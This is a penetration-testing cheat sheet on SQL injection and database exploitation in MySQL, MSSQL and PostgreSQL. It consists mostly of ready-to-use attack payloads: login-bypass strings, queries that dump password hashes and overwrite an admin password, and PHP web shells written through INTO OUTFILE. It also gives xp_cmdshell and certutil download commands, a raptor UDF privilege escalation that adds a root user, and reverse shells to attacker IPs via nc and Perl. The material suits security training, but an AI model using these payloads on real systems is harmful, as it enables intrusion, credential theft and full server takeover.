## Authentication bypass methods:
---
```
admin ' -- -
admin 'OR '1'='1
admin 'OR '1'='1
admin ' or 1=1--
admin ' or 1=1;#
admin ' OR '1'='1
admin ' OR 1='
admin ' OR 1=1;--
'OR '1'='1
'OR '1'='1
' or 1=1--
' or 1=1;#
'OR '1'='1
' OR 1='

```

## Union based SQL Injection
---
#### NOTE
*The following is using MySQL as the example DBMS to demonstrate the enumeration methodology to perform Union based SQL Injection.*

### 1. Find SQLi
use common methods to cause an error in the parsing of data to the database. if no errors are returned you can check for blind sqli with a sleep command:
```
' SLEEP(15); --
```
in this example, if the databse takes 15 seconds to return any results, it could be an indication of a vulnerable SQL perameter. 

You can also output a script to a file on the machine. If there is a way of executing the script, such as storing in the web directory and running it, a reverse shell might be achievable.
```
' UNION SELECT null AND '[script]' INTO OUTFILE '[location]' ; #
```

### 2. Find Columns (use null)
The UNION operator is used to combine the result-set of two or more SELECT statements. To combine the result of two select statements in a single query, the amount of columns selected in the UNION statement must match the backend query. If the columns do not match, a union will not work. The first query to return without an error is the amount of columns in the current table you are adding to 
```
' UNION SELECT null, null, null ; # = 3 columns
' UNION SELECT null, null, null, null ; # = 4 columns & Returns error, 
```
We now know we have 3 columns.
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
| null | null | null |

### 2.5 ORDER BY Instead of Adding SELECT Statements
Another way we can perform UNION injection to find the columns returned from the original table, is to use order by which will add columns for each number in the table:
```
' UNION ORDER BY 3; #
```
This will return 3 numbered columns if the UNION is successful:
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
| 1 | 2 | 3 |

### 3. Find Type and Version of DBMS Running
SQL DBMS' all have deviations in syntax, running commands that are unique to each flavour will quickly distinguish which DBMS is running the application. Error messages can also be helpful for determining which DBMS is running in the backend.
```
' UNION SELECT null, version(), null; #
' UNION SELECT null, @@version, null; #
```
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
|  | MySQL 4.1.14 |  |
### 4. Query privaleged information
Use pentest monkey's cheat sheet to help determine syntax for dropping the database table schemas:
https://pentestmonkey.net/category/cheat-sheet/sql-injection

MSSQL is slightly different, but i would avoid union injection all together with MSSQL as you can just run `xp_cmdshell` to run commands directly on the operating system. More on this further down the document.
```
' UNION SELECT TABLE_NAME, TABLE_SCHEMA, null FROM information_schema.tables; #
```
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
| ALL_PLUGINS | information_schema |  |
|COLUMNS|information_schema||
|...|...|...|
|UserInformation|information_schema||
|...|...|...|


In this example, we have found the UserInformation table, we need to find the columns in that table:
```
' UNION SELECT COLUMN_NAME, null, null FROM information_schema.columns WHERE TABLE_NAME = 'UserInformaiton'; #
```
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
| LoginName |  |  |
|LoginHashPassword|||
|LoginID|||

We now know the column names, we can wuery to find a list of users and their hashed passwords for later attacks.
```
' UNION SELECT LoginName, LoginHash, LoginID FROM UserInformation;#
```
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
| Admin | f5dd6524e64e7c36130cfa745ac7ff76 | 4873 |
|Bob_French|16bc78da95db4b5190e578a67bca565b|8393|
|Gabriel_greer|b3acda20ea55c158c7d1aba14adbbc46|9183|


### 5. Update Credentials:
In this example we are going to update the admin credentials on the database using the UPDATE Method.  Firstly we take the hashed password from the database and identify which hash it is. We can use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to help us do this, or use the kali built in tool, [hashid](https://www.kali.org/tools/hashid/) 
```
kali$ hashid f5dd6524e64e7c36130cfa745ac7ff76
Analyzing 'f5dd6524e64e7c36130cfa745ac7ff76'
[+] MD5 
```
We then generate a password hash in the hash type that is being used by the database to authenticate:
```
kali$ echo "oneequalsone" | md5sum                                                                                                                           
780c83182a8d8bdbe69bdcf6a7b8d734  

```
Now, we can update the password with the generated MD5 hash for the password 'oneequalsone':
```
' UPDATE UserInformation SET LoginHashPassword = '780c83182a8d8bdbe69bdcf6a7b8d734' WHERE LoginID = 4873;#
```

### 6. Read a file
The following can be used to read files on the local system with the right permissions
```
' UNION SELECT LOAD_FILE('/etc/passwd') , null, null;#
```
| ProductName | ProductID | OrderID |
|----|----|----|
| Socks | 12543 | 8756|
| Football | 25631 | 2953 |
| Gloves | 52316| 1235 |
|root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin ... adminpete:x:1000:1000:adminpete,,,:/home/adminpete:/usr/bin/zsh...  | | |

### 7. Upload a file
To upload a file we can set a string and send it to a file on the machine. we could send it to a place we can execute code, such as in the web root directory and navigate to the file to execute it. Here is an example:
```
' UNION SELECT null, null, null AND '<?php system($_GET["cmd"]); ?>'  into outfile '/tmp/cmd.php' ;#
```
#### NOTE
When URL encoding is needed to adhear to the HTTP protocol, it is important to know what will be interpreted as URL encoded charicters. 
```
'%20UNION%20SELECT%20'<?php%20echo%20passthru($_GET["cmd"]);?
```
You may also need to include extra functions for SQL injection to be viable, like in this example where i am exploiting a vulnerability where a URL perameter has to be kept in the query to perform the injection on  [Ovidentia version 7.9.4](https://www.exploit-db.com/exploits/27771#:~:text=delete_type%26item%3D1-,%2527%26entitytype%3D2,-Copy) (Scroll down on the link to see the part I hilighted. %27 in URL encoding is a single quote):
```
>'%20INTO%20OUTFILE%20'C:/wamp/www/PHP/cmd.php'--%20-&entitytype=2
```

## URL Based SQL Injection
Some SQL distributions require sequences to define where commented charicters end command execution can begin, such as MySQL. MySQL requires each comment sequence to be followed by at minimum one white space, or control chariacter if we do not put a control charicter in, the SQL code wont execute: 
```
;-- -
;# -
```
Here is an example:
```
	tg=admoc&idx=octypes&action=delete_type&item=2' UNION SELECT '[script]' INTO OUTFILE '[outfile]'-- -&entitytype=1
```
Here is an example which would allow you to visit the http site and go to the cmd.php page to run commands using the cmd perameter:
```
tg=admoc&idx=octypes&action=delete_type&item=2' UNION SELECT null AND '<?php system($_GET["cmd"]); ?>'  INTO OUTFILE '/wamp/www/PHP/cmd.php'-- -&entitytype=1

http://10.10.10.10/cmd.php?cmd=whoami
```
This is what the code would look like outside of the url:
```
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/wamp/www/PHP/cmd.php' ;#
```

#### xp_cmdshell Example in URL
Here, we can see how it is possible to recondigure MSSQL to run commands directly from the websites URL:
```
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; reconfigure with override; exec master..xp_cmdshell 'ping -n 10 localhost'`
1; EXEC sp_configure 'show advanced options, 1; EXEC sp_configure
```

## Interacting with a database via a network:
In this example, we are connecting directly to an MSSQL server where we know the password for the root user. From here, we are setting permissions and functions, then running commands using the xp_cmdshell function available in MSSQL. [sqsh](https://manpages.ubuntu.com/manpages/kinetic/en/man1/sqsh.1.html) is a great tool for database interactions in MSSQL:
```
command execution in SQL Server:
sqsh
sqsh -U [user] -P [password] -S [ip]:[port] -D [database] 
sqsh -U [user] -P [password] -S [ip]
sqsh -S 10.11.1.31 -U sa -P poiuytrewq
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell', 1
reconfigure
go
```
At this point, we should be able to execute our commands. We can use certutil on windows to download and execute files directly on the operating system:
```
xp_cmdshell 'certutil -urlcache -split -f http://192.168.49.90/rshell.exe rshell.exe'
go
```

## Raptor MySQL Exploit:
Raptor is a known exploit where before version 4.1.14 you could load an arbitrary kernel moduile into the mysql process. with user defined fuinctions we can run commands on mysql if we have root access to the database within the context of the MySQL process. if the process is owned by root, we can run as that user. 

In the example we are using this to add a user to /etc/passwd with the credentials of oneequalsone : securitytraining
```
make password:
	md5 (/etc/passwd):
		openssl passwd [password]
	sha512 (/etc/shadow):
		mkpasswd -m sha-512 [password]

kali$ openssl passwd securitytraining
kali$ xd1aAlLUOvwKo

```
Resources to help you understand the attack:
```
blog: https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
https://www.exploit-db.com/exploits/1518
https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_64.so
```

Compiling the .so file for MySQL using GCC:
```
-m32 flag should be used for x64. this flag isnt needed for x86
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Usage:
$ id
uid=500(raptor) gid=500(raptor) groups=500(raptor)
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root -p
Enter password:
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
mysql> select do_system('cat /etc/shadow > /tmp/out; echo "oneequalsone:xd1aAlLUOvwKo.:0:0::/root:/bin/bash" >> /etc/passwd');
mysql> \! sh
sh-2.05b$ cat /tmp/out
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```
we can also login directly to the underlying operating system as the user 'oneequalsone' and the password 'securitytraining'.

## MySQL Post Exploitation steps:
```
user defined functions:
with user defined fuinctions we can run commands on mysql if we have root access to the db with the context of the mysql process. if the process is owned by root, we can run as that user. 

ps aux | grep mysql
mysql -V
mysql -u root -p -e 'select @@version;'

searchsploit -m linux/local/1518.c
gcc -g -c 1518.c -o raptor_udf2.o -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

use mysql;
create table foo(line blob);
insert into foo values(load_file('<path to UDF file>'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/udf_file_name.so';
create function do_system returns integer soname 'udf_file_name.so';
show variables like '%plugin%';
select do_system('<command>');
select do_system('cp /bin/bash /tmp/stef; chmod +xs /tmp/stef');
exit sql
/tmp/stef -p
```

### Metasploit lib_mysqludf_sys_64.so:
Although this doesnt directly use the metasploit console, it does count as using metasploit in the OSCP exam if you are thinking about sitting it. To use the [Metasploit raptor exploit](https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_64.so), use the following commands:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_64.so

Another way:

use mysql;
create table oneequalsone(line blob)
insert into oneequalsone values(load_file('/tmp/lib_mysqludf_sys_64.so'));
insert into oneequalsone values(load_file('/tmp/lib_mysqludf_sys_64.so'));
select * from oneequalsone into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('nc -e /bin/sh 192.168.49.124 8080');
```
## Postgresql
This section details how postgresql servers can be interacted with and exploited. 
```
psql -U postgres -p 5437 -h 192.168.118.47
default password:
postgres
listing contents in directories:
select pg_ls_dir ('./');
select pg_ls_dir('/etc/passwd');
select file.read('/etc/passwd');
select pg_read_file('/etc/passwd');
pg machine nibbles

exploit:
https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.118:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

OR

postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
```
